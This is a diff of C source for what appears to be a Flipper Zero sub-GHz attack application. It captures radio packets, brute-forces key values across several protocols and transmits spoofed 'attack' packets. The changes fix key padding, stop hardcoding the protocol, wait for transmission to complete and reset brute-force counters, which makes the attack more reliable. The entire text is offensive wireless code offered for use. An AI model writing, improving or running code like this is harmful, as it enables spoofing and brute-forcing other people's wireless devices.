@@ -278,7 +278,7 @@ static void subghz_receiver_callback(
         subghz_receiver_reset(receiver);
         FURI_LOG_I(LOGGING_TAG, "Captured:\r\n%s", furi_string_get_cstr(buffer));
 
-        size_t packet_size = 3;
+        const size_t packet_size = 3;
         uint8_t packet[packet_size];
         memset(packet, 0, packet_size);
         char* key_str = alloc_extract_value_from_string("Key", furi_string_get_cstr(buffer));
@@ -405,9 +405,9 @@ static void
     subghz_send_attack_with_packet(State* state, Payload* payload, uint8_t size, uint8_t* packet) {
     FURI_LOG_I(
         LOGGING_TAG,
-        "Sending attack with Protocol: %s, Bit: %lu, Key: %.*s, TE: %lu, Repeat: %lu",
+        "Sending attack with Protocol: %s, Bit: %lu, Key: %.*s, Length: %u, TE: %lu, Repeat: %lu",
         payload->subghz_protocol,
-        (unsigned long)payload->bits,
+        payload->bits,
         size * 3,
         ({
             static char temp[256];
@@ -416,15 +416,20 @@ static void
             }
             temp;
         }),
+        size,
         payload->te,
         payload->repeat);
+
+    uint8_t key_data[sizeof(uint64_t)] = {0};
+    memcpy(&key_data[sizeof(key_data) - size], packet, size);
 
     SubGhzTransmitter* transmitter =
         subghz_transmitter_alloc_init(state->environment, payload->subghz_protocol);
     FlipperFormat* flipper_format = state->flipper_format;
-    flipper_format_insert_or_update_string_cstr(flipper_format, "Protocol", "Princeton");
+    flipper_format_insert_or_update_string_cstr(
+        flipper_format, "Protocol", payload->subghz_protocol);
     flipper_format_insert_or_update_uint32(flipper_format, "Bit", &payload->bits, 1);
-    flipper_format_insert_or_update_hex(flipper_format, "Key", packet, size);
+    flipper_format_insert_or_update_hex(flipper_format, "Key", key_data, sizeof(uint64_t));
     flipper_format_insert_or_update_uint32(flipper_format, "TE", &payload->te, 1);
     flipper_format_insert_or_update_uint32(flipper_format, "Repeat", &payload->repeat, 1);
     flipper_format_insert_or_update_uint32(flipper_format, "Guard_time", &payload->guard_time, 1);
@@ -440,7 +445,11 @@ static void
 
     furi_hal_power_suppress_charge_enter();
 
-    subghz_devices_start_async_tx(state->device, subghz_transmitter_yield, transmitter);
+    if(subghz_devices_start_async_tx(state->device, subghz_transmitter_yield, transmitter)) {
+        while(!(subghz_devices_is_async_complete_tx(state->device))) {
+            furi_delay_ms(5);
+        }
+    }
     subghz_transmitter_free(transmitter);
 }
 
@@ -521,7 +530,20 @@ static void start_attack(State* state) {
     }
 }
 
-static void process_bruteforce(State* state) {
+static void bruteforce_init(State* state) {
+    if(attacks[state->index].protocol == NULL) {
+        for(int i = 1; i < ATTACKS_COUNT; i++) {
+            Payload* payload = &attacks[i].payload;
+            payload->bruteforce.counter = 0;
+            payload->bruteforce.value = 0;
+        }
+    } else {
+        Payload* payload = &attacks[state->index].payload;
+        payload->bruteforce.counter = 0;
+        payload->bruteforce.value = 0;
+    }
+}
+static void bruteforce_process(State* state) {
     if(attacks[state->index].protocol == NULL) {
         for(int i = 1; i < ATTACKS_COUNT; i++) {
             Payload* payload = &attacks[i].payload;
@@ -549,11 +571,12 @@ static void process_bruteforce(State* state) {
 static int32_t adv_thread(void* _ctx) {
     State* state = _ctx;
     start_blink(state);
+    bruteforce_init(state);
     state->last_switch_time = furi_get_tick();
     state->is_find_station = true;
 
     while(state->advertising) {
-        process_bruteforce(state);
+        bruteforce_process(state);
         start_attack(state);
 
         furi_delay_ms(10);
